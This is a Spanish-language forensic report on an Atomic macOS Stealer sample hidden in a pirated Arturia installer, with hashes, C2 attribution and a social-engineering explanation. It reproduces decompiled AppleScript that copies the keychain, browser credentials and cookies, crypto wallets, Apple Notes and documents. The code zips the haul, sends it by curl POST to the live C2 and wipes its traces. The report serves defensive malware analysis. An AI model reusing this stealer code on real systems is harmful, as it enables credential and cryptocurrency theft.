# Análisis Forense Profundo: Ingeniería Inversa de Atomic macOS Stealer (AMOS)

- **Muestra origen:** `Open Gatekeeper friendly` (embebido en `Arturia Analog Lab V Pro v5.10.2.4741.dmg`)
- **Tipo de archivo:** AppleScript Droplet compilado / Mach-O universal x86_64 y arm64
- **Hash SHA-256:** `b32cca8b57c79409887fe4e5cdbabdf7687a993fb3f82e5f736f2b3bf058bdcc`
- **Hash MD5:** `e45071579d5b58f7e05d7fefdd49f868`
- **Clasificación:** 🚨 **MALWARE ACTIVO - INFO-STEALER DE ALTA SEVERIDAD**
- **Servidor C2 Identificado:** `http://79.137.192.4/p2p` (AS216246 Aeza Group, San Petersburgo, Rusia)

---

## 🛡️ Nota Previa de Seguridad: ¿Tu Mac corre algún riesgo?

> [!NOTE]
> **Tu equipo está 100% fuera de peligro.**  
> 1. El binario malicioso **NUNCA fue ejecutado ni abierto**.
> 2. El análisis se realizó de manera estrictamente pasiva: extrayendo las cadenas de texto en memoria sin cargar el ejecutable en el procesador.
> 3. La imagen de disco de Arturia ya fue desmontada y expulsada del sistema.
> 4. El archivo que estás leyendo es un documento Markdown (`.md`), es decir, **texto plano inerte** que no puede ejecutar instrucciones ni comandos en tu sistema.

---

## 1. El Vector de Ingeniería Social: El Señuelo "Gatekeeper Friendly"

Los desarrolladores del malware emplean una táctica de manipulación psicológica habitual en el ecosistema de audio pirata:
1. Saben que macOS bloqueará el archivo por no tener firma oficial de Apple.
2. Saben que los usuarios de plugins piratas están acostumbrados a recibir instrucciones para "desactivar Gatekeeper" o limpiar la cuarentena.
3. Nombran al ejecutable malicioso como **`Open Gatekeeper friendly`**, haciéndole creer al usuario que es una utilidad técnica inofensiva que corregirá el error de apertura del instalador legítimo `Analog_Lab_V__5_10_2_4741.pkg`.

---

## 2. Desglose e Ingeniería Inversa del Código Fuente (Línea por Línea)

A continuación se desglosa el código descompilado extraído del binario, estructurado por sus rutinas de ataque:

### A. Reconocimiento del Sistema y Entorno
El malware comienza obteniendo la identidad del usuario y un inventario de hardware y software de la máquina:

```applescript
set username to (system attribute "USER")
set profile to "/Users/" & username
set writemind to "/tmp/xuyna/"
try
    set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
    writeText(result, writemind & "user")
end try
```
* **Análisis:** Obtiene el nombre del usuario activo, establece como carpeta de trabajo temporal `/tmp/xuyna/` (término vulgar en ruso que delata el origen del grupo cibercriminal) y ejecuta `system_profiler` para inventariar el modelo exacto de Mac, versión de macOS y pantallas conectadas.

---

### B. Robo del Llavero Maestro de macOS (Keychain)
```applescript
readwrite(profile & "/Library/Keychains/login.keychain-db", writemind & "keychain")
```
* **Análisis:** Copia directamente la base de datos `login.keychain-db`, que almacena las contraseñas guardadas del sistema, certificados privados, claves Wi-Fi y tokens de acceso de aplicaciones de macOS.

---

### C. Función `chromium()`: Caza de Credenciales en 10 Navegadores
El malware no solo ataca Google Chrome, sino toda la familia de navegadores derivados de Chromium:

```applescript
set chromiumMap to {
    {"Chrome", library & "Google/Chrome/"},
    {"Brave", library & "BraveSoftware/Brave-Browser/"},
    {"Edge", library & "Microsoft Edge/"},
    {"Vivaldi", library & "Vivaldi/"},
    {"Opera", library & "com.operasoftware.Opera/"},
    {"OperaGX", library & "com.operasoftware.OperaGX/"},
    {"Chrome Beta", library & "Google/Chrome Beta/"},
    {"Chrome Canary", library & "Google/Chrome Canary/"},
    {"Chromium", library & "Chromium/"},
    {"Chrome Dev", library & "Google/Chrome Dev/"}
}
```
* **Análisis:** Itera sobre cada uno de estos directorios buscando los archivos SQLite internos de los navegadores:
  * `Login Data`: Contraseñas guardadas en los navegadores.
  * `Cookies`: Cookies de sesión activas (permite a los atacantes saltarse la autenticación en dos pasos / 2FA ingresando a cuentas como Gmail, GitHub, Instagram o bancos sin pedir código SMS).
  * `Web Data`: Datos de autorrelleno (tarjetas de crédito, direcciones).

Adicionalmente, ataca navegadores basados en Gecko:
```applescript
set ff_paths to {library & "Firefox/Profiles/", library & "Waterfox/Profiles/", library & "Pale Moon/Profiles/"}
```
Y roba las cookies nativas de Apple Safari:
```applescript
duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath
```

---

### D. Función `deskwallets()`: Saqueo Masivo de Billeteras Cripto
El malware contiene un mapa exhaustivo para robar los archivos de claves privadas y configuraciones de más de 15 billeteras de criptomonedas:

```applescript
set walletMap to {
    {"deskwallets/Electrum", profile & "/.electrum/wallets/"},
    {"deskwallets/Coinomi", library & "Coinomi/wallets/"},
    {"deskwallets/Exodus", library & "Exodus/"},
    {"deskwallets/Atomic", library & "atomic/Local Storage/leveldb/"},
    {"deskwallets/Wasabi", profile & "/.walletwasabi/client/Wallets/"},
    {"deskwallets/Ledger_Live", library & "Ledger Live/"},
    {"deskwallets/Monero", profile & "/Monero/wallets/"},
    {"deskwallets/Bitcoin_Core", library & "Bitcoin/wallets/"},
    {"deskwallets/Litecoin_Core", library & "Litecoin/wallets/"},
    {"deskwallets/Dash_Core", library & "DashCore/wallets/"},
    {"deskwallets/Electrum_LTC", profile & "/.electrum-ltc/wallets/"},
    {"deskwallets/Electron_Cash", profile & "/.electron-cash/wallets/"},
    {"deskwallets/Guarda", library & "Guarda/"},
    {"deskwallets/Dogecoin_Core", library & "Dogecoin/wallets/"},
    {"Trezor_Suite", library & "@trezor/suite-desktop/"}
}
```
* **Análisis:** Si el usuario tiene instalada cualquiera de estas billeteras (incluso de hardware como Ledger o Trezor), el malware copia los almacenes de claves locales (`leveldb`, `wallets/`, `config.json`) para intentar descifrarlas fuera de línea.

---

### E. Función `filegrabber()`: Exfiltración de Notas de Apple y Documentos
```applescript
set notesFiles to {
    file "NoteStore.sqlite", 
    file "NoteStore.sqlite-shm", 
    file "NoteStore.sqlite-wal"
} of notesFolder
```
* **Análisis:** Roba la base de datos íntegra de la app **Notas (Apple Notes)**. En estas notas es muy común que los usuarios anoten claves de respaldo, números PIN, frases semilla de criptomonedas o información médica.

A continuación, rastrea activamente el Escritorio y los Documentos del usuario:
```applescript
set extensionsList to {"txt", "rtf", "key", "keys", "png", "jpg", "jpeg", "wallet", "doc", "docx", "kdbx"}
repeat with aFile in (desktopFiles & documentFiles)
    if fileExtension is in extensionsList then
        if (bankSize + fileSize) < 10 * 1024 * 1024 then
            duplicate aFile to folder destinationFolderPath
        end if
    end if
end repeat
```
* **Análisis:** Recoge documentos de texto, bases de datos de contraseñas de KeePass (`.kdbx`), archivos de claves (`.key`, `.keys`), billeteras sueltas (`.wallet`) y archivos de Word/PDF, limitando el tamaño acumulado a 10 MB para que la subida sea instantánea y no sature la conexión.

---

### F. Función `send_data()`: Compresión y Envío C2
Una vez reunido todo el material en `/tmp/xuyna/`, el malware lo comprime y lo envía a través de internet:

```applescript
do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/out.zip"
```
* Usa la utilidad nativa de macOS `ditto` para crear un archivo zip silenciosamente sin mostrar ninguna ventana.

Luego realiza el envío:
```applescript
on send_data(writemind, uuid, userme, buildid, attempt)
    try
        set result_send to (do shell script "curl -X POST -H \"uuid: " & uuid & "\" -H \"user: " & userme & "\" -H \"buildid: " & buildid & "\" --data-binary @/tmp/out.zip http://79.137.192.4/p2p")
    on error
        if attempt < 10 then
            delay 60
            send_data(writemind, uuid, userme, buildid, attempt + 1)
        end if
    end try
end send_data
```
* **Análisis:** Realiza una petición `curl -X POST` enviando el archivo `/tmp/out.zip` directamente al servidor ruso **`79.137.192.4/p2p`**.
* Si la conexión falla (por ejemplo, si el equipo pierde internet momentáneamente), el script espera 60 segundos y reintenta hasta 10 veces de forma encubierta.

---

### G. Limpieza de Rastros (*Anti-Forensics*)
```applescript
do shell script "rm -r " & writemind
do shell script "rm -r /tmp/photos"
do shell script "rm /tmp/out.zip"
```
* Una vez exfiltrada la información, borra de inmediato `/tmp/xuyna/` y `/tmp/out.zip`. Para un usuario común, no queda ningún rastro visible en el disco.

---

## 3. Atribución e Inteligencia de Amenazas

* **Actor de Amenazas:** Operadores de **Atomic macOS Stealer (AMOS)**.
* **Modelo de negocio:** Malware-as-a-Service (MaaS) vendido en foros de la *dark web* de habla rusa por suscripciones de aproximadamente $1.000 a $3.000 USD mensuales.
* **Infraestructura de red:**
  * **IP C2:** `79.137.192.4`
  * **Proveedor:** AS216246 (Aeza Group / Aeza International LTD)
  * **Ubicación:** San Petersburgo / Moscú, Federación Rusa.
  * **Ruta de la API:** `/p2p`

---

## 4. Conclusión Forense

El instalador analizado representa un caso de libro de **troyanización de software legítimo**:
* El atacante no necesitó modificar el complejo programa de 4.95 GB de Arturia ni sus librerías de sonido.
* Dejó el instalador oficial de Arturia completamente intacto (notarizado por Apple) para ganar confianza y empaquetó junto a él un droplet de AppleScript malicioso llamado `Open Gatekeeper friendly`.
* Si el usuario caía en la trampa y hacía doble clic en ese archivo, **en menos de 3 segundos todas sus sesiones de internet, billeteras de criptomonedas y contraseñas de Keychain habrían sido transferidas a Rusia**.

El análisis estático estricto evitó al 100% la ejecución de cualquier fase de este ataque.
